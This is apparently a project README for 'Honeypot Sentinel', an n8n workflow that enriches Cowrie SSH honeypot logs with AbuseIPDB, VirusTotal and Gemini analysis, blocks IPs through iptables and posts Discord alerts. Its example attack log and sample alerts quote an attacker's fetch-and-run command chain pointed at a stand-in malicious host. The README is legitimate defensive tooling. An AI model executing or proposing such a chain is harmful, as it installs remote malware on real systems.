# Honeypot Sentinel

**Automated Threat Detection and Analysis System for SSH/Telnet Honeypots**

[](https://opensource.org/licenses/MIT)
[](https://n8n.io)
[](https://github.com/cowrie/cowrie)

## 📋 Overview

Honeypot Sentinel is an automated security monitoring solution that transforms raw honeypot attack logs into actionable threat intelligence. Built with n8n workflow automation, it provides real-time analysis, IP reputation checking, malware URL scanning, and AI-powered threat assessment.

```mermaid
graph TD
    A[☠️ Hacker] -->|SSH Attack| B(🍯 Cowrie Honeypot)
    B -->|JSON Logs| C{📝 Filebeat/Logstash}
    C -->|Webhook| D[🧠 n8n Orchestrator]
    
    %% Pipeline de Enriquecimento (Sequencial)
    D -->|1. Reputation Check| E[🌍 AbuseIPDB]
    E -->|2. Malware Scan| F[🦠 VirusTotal]
    F -->|3. Threat Analysis| G[🤖 Google Gemini AI]
    
    %% Decisão baseada na IA
    G -->|Risk Score| H{⚖️ Decision Logic}
    
    H -->|Critical > 80%| I[🔥 Block IP via SSH/iptables]
    H -->|Info / Warning| J[💬 Discord Notification]
    I --> J
    
    style A fill:#ff4d4d,stroke:#333,stroke-width:2px,color:#fff
    style B fill:#ff9f43,stroke:#333,stroke-width:2px,color:#fff
    style D fill:#54a0ff,stroke:#333,stroke-width:2px,color:#fff
    style G fill:#1dd1a1,stroke:#333,stroke-width:2px,color:#fff
    style I fill:#ee5253,stroke:#333,stroke-width:4px,color:#fff
```



### Key Features

- 🔍 **Real-time Attack Monitoring** - Continuous monitoring of Cowrie honeypot logs via Filebeat and Logstash
- 🌐 **IP Reputation Analysis** - Integration with AbuseIPDB for attacker IP reputation scoring
- 🦠 **Malware URL Detection** - Automatic extraction and scanning of URLs via VirusTotal API
- 🤖 **AI-Powered Threat Analysis** - Leverages Gemini AI for MITRE ATT&CK classification and incident reports
- 🛡️ **Automated Defense** - Automatic IP blocking via iptables for high-risk attackers (>80% abuse score)
- 📊 **Centralized Logging** - Attack data logged to Google Sheets for historical analysis
- 💬 **Discord Alerts** - Real-time security incident notifications to Discord channels

## 🚀 Quick Start

### Prerequisites

- **Cowrie Honeypot** installed and running
- **Filebeat** and **Logstash** configured
- **n8n** workflow automation platform
- **Google Sheets API** access
- **Discord Bot** with webhook permissions
- **API Keys** for:
  - AbuseIPDB
  - VirusTotal
  - Google Gemini AI

### Installation

1. **Clone this repository**
   ```bash
   git clone https://github.com/Khimira/honeypot-sentinel.git
   cd honeypot-sentinel
   ```

2. **Configure Filebeat**
   ```bash
   sudo cp filebeat.yml /etc/filebeat/filebeat.yml
   # Edit the file and update the Cowrie log path
   sudo nano /etc/filebeat/filebeat.yml
   sudo systemctl restart filebeat
   ```

3. **Configure Logstash**
   ```bash
   sudo cp logstash.conf /etc/logstash/conf.d/honeypot.conf
   # Update the n8n webhook URL
   sudo nano /etc/logstash/conf.d/honeypot.conf
   sudo systemctl restart logstash
   ```

4. **Import n8n Workflow**
   - Open n8n interface
   - Go to **Workflows** → **Import from File**
   - Select `honeypot-sentinel-workflow.json`
   - Configure credentials:
     - AbuseIPDB API Key
     - VirusTotal API Key
     - Google Sheets OAuth
     - Discord Bot Token
     - SSH Private Key (for remote execution)

5. **Configure the Workflow**
   - Update webhook URL in Logstash output
   - Set your Discord server/channel IDs
   - Configure Google Sheets document ID
   - Test the webhook endpoint

## 📊 Workflow Breakdown

### 1. Data Ingestion
- **Webhook** receives POST requests from Logstash containing aggregated attack sessions
- **Parse Honeypot Data** extracts attacker IP, commands, and event metadata
- **Format Fields** normalizes data for downstream processing

### 2. Threat Intelligence
- **AbuseIPDB Reputation Check** queries IP reputation database
  - Returns abuse confidence score (0-100%)
- **Extract URLs from Commands** uses regex to identify malicious download URLs
- **VirusTotal URL Scan** analyzes extracted URLs for malware
- **AI Malware Analysis** sends VirusTotal results to Gemini AI for:
  - Malware family classification
  - Threat level assessment
  - IOC (Indicators of Compromise) extraction
  - Attack campaign identification

### 3. Analysis & Response
- **AI Threat Analysis** sends incident data to Gemini AI for:
  - MITRE ATT&CK tactic classification
  - Malware behavior analysis
  - Severity scoring (0-10)
  - Suggested remediation actions
- **Check Abuse Score** conditionally triggers IP blocking (threshold: 80%)
- **Block IP via iptables** automatically adds firewall rule for high-risk IPs

### 4. Logging & Alerting
- **Log to Google Sheets** creates permanent record with:
  - Timestamp
  - Attacker IP
  - Country & ISP
  - Commands executed
  - AbuseIPDB score
- **Send Discord Alert** posts formatted security incident report

## 🔧 Configuration

### Filebeat Configuration

Update the Cowrie log path in `filebeat.yml`:

```yaml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /path/to/cowrie/var/log/cowrie/cowrie.json*
  tags: ["honeypot_cowrie"]
```

### Logstash Configuration

Update the n8n webhook URL in `logstash.conf`:

```ruby
output {
  http {
    url => "http://your-n8n-instance:5678/webhook/honeypot_logs"
    http_method => "post"
    format => "json"
  }
}
```

### n8n Workflow

Replace placeholder values in the imported workflow:

- `YOUR-WEBHOOK-ID-HERE` → Your n8n webhook ID
- `YOUR-CREDENTIAL-ID` → Your credential IDs for each service
- `YOUR-DISCORD-GUILD-ID` → Your Discord server ID
- `YOUR-DISCORD-CHANNEL-ID` → Your Discord channel ID
- `YOUR-GOOGLE-SHEETS-ID` → Your Google Sheets document ID

## 📈 Data Fields

### Google Sheets Log Columns

| Column | Description |
|--------|-------------|
| TIMESTAMP | ISO 8601 timestamp of the attack |
| ATTACKER IP | Source IP address of attacker |
| COUNTRY | Country code from AbuseIPDB |
| ISP | Internet Service Provider |
| COMMAND | Full command sequence executed |
| ABUSEIPDB SCORE | Abuse confidence percentage |

### Discord Alert Format

**Standard Threat Alert:**
```markdown
🛡️ **SECURITY INCIDENT DETECTED**
**IP**: 192.0.2.1 (CN) - Score: 95%
**AI Verdict**: Automated botnet attack attempting to download cryptocurrency miner
**Severity**: 85/100
**MITRE ATT&CK**: T1059 (Command and Scripting Interpreter)
**Suggested Actions**: IP blocked via iptables. Monitor for additional attacks from same ASN.
**Technical Insight**: Attack pattern indicates Mirai variant targeting weak SSH credentials
```

**Malware URL Alert:**
```markdown
🦠 **MALWARE URL DETECTED**
**URL**: http://malicious.com/bot.sh
**IP**: 192.0.2.1 (CN)
**VirusTotal Detection**: 45/89 vendors flagged as malicious
**Malware Family**: Mirai Botnet Variant
**Threat Level**: Critical
**Attack Vector**: SSH brute force followed by automated script download
**Recommended Actions**: URL blocked, IP quarantined. Review network for similar patterns.
**IOCs**: 
  - URL: http://malicious.com/bot.sh
  - Hash: a1b2c3d4e5f6...
  - C2 Server: 203.0.113.42
```

## 🛡️ Security Considerations

- **API Keys**: Store all API keys securely in n8n credentials manager
- **SSH Access**: Use SSH key authentication, not passwords
- **Firewall**: Ensure n8n webhook is not publicly accessible
- **Rate Limits**: Be aware of API rate limits for AbuseIPDB and VirusTotal
- **False Positives**: Review automated IP blocks periodically

## 🔄 Customization

### Adjusting IP Block Threshold

Modify the abuse score threshold in the "Check Abuse Score" node:

```javascript
// Current threshold: 80%
// Increase for fewer blocks, decrease for more aggressive blocking
if (abuseScore > 80) {
  // Block IP
}
```

### Custom AI Prompts

Edit the AI analysis prompts in these nodes to customize:

**AI Threat Analysis:**
- Report format
- Analysis depth
- MITRE ATT&CK focus areas
- Severity scoring criteria

**AI Malware Analysis:**
- Malware classification methodology
- IOC extraction rules
- Threat level assessment criteria
- Campaign correlation logic

### Adding Additional Actions

Extend the workflow by adding nodes for:
- Email notifications
- Slack alerts
- SIEM integration (Splunk, ELK)
- Threat intelligence platforms (MISP, OpenCTI)
- Automated incident ticketing

## 📝 Example Attack Log

```json
{
  "timestamp": "2025-01-31T14:23:45Z",
  "attacker_ip": "192.0.2.1",
  "country": "CN",
  "isp": "China Telecom",
  "commands": "wget http://malicious.com/bot.sh, chmod +x bot.sh, ./bot.sh",
  "abuse_score": "95%",
  "severity": 85,
  "mitre_tactic": "T1105 - Ingress Tool Transfer",
  "action_taken": "IP blocked via iptables"
}
```

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request. For major changes:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- [Cowrie Honeypot](https://github.com/cowrie/cowrie) - SSH/Telnet honeypot
- [n8n](https://n8n.io) - Workflow automation platform
- [AbuseIPDB](https://www.abuseipdb.com) - IP reputation database
- [VirusTotal](https://www.virustotal.com) - Malware scanning service
- [Google Gemini](https://ai.google.dev) - AI threat analysis
- [Elastic Stack](https://www.elastic.co) - Filebeat and Logstash

## 📧 Support

- **Issues**: [GitHub Issues](https://github.com/Khimira/Honeypot-Sentinel/issues)
- **Email**: khimira.dev@gmail.com

---

## ⚠️ Disclaimer

This tool is intended for legitimate security research and monitoring purposes only. Users are responsible for compliance with applicable laws and regulations. The authors assume no liability for misuse of this software.

